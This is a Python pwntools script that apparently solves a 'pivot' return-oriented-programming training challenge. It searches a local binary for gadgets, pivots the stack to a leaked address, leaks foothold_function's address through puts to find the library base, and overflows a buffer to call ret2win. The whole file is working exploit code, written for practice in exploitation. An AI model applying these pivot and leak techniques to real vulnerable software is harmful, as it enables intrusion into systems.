from pwn import *

elf = context.binary = ELF('./pivot')
lib = ELF('./libpivot.so')

context.log_level = 'debug'

offset = 32

p = process()

p.recvuntil(': ')
pivot = p.recvline().strip(b'\n')
pivot = int(pivot, 16)
log.info("pivot, %#x", pivot)

rop_pivoted = ROP(elf)

pop_rdi = rop_pivoted.find_gadget(['pop rdi', 'ret'])[0]

# rop_pivoted.raw(0)
rop_pivoted.raw(elf.sym.foothold_function)
rop_pivoted.raw(pop_rdi)
rop_pivoted.raw(elf.got.foothold_function)
rop_pivoted.raw(elf.plt.puts)
rop_pivoted.raw(elf.sym.main)
# rop_pivoted.raw(0x0000000000400950)

p.sendafter('>', rop_pivoted.chain())

rop_pivot = ROP(elf)

leave_ret = rop_pivot.find_gadget(['leave', 'ret'])[0]
pop_rbp = rop_pivot.find_gadget(['pop rbp'])[0]
pop_rax = rop_pivot.find_gadget(['pop rax', 'ret'])[0]
xchg_rsp_rax = 0x00000000004009bd

rop_pivot.raw(b'A' * (offset+8))
rop_pivot.raw(pop_rax)
rop_pivot.raw(pivot)
rop_pivot.raw(xchg_rsp_rax)

p.sendafter('>', rop_pivot.chain())

p.recvuntil('libpivot\n')
leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
log.info('leak, %#x', leak)
lib.address = leak - lib.sym.foothold_function
log.info('base, %#x', lib.address)
log.info('ret2win, %#x', lib.sym.ret2win)

payload = b'A' * 40 + p64(lib.sym.ret2win)

p.sendlineafter('> ', 'C'*8)
p.sendlineafter('> ', payload)
print(p.recvall())
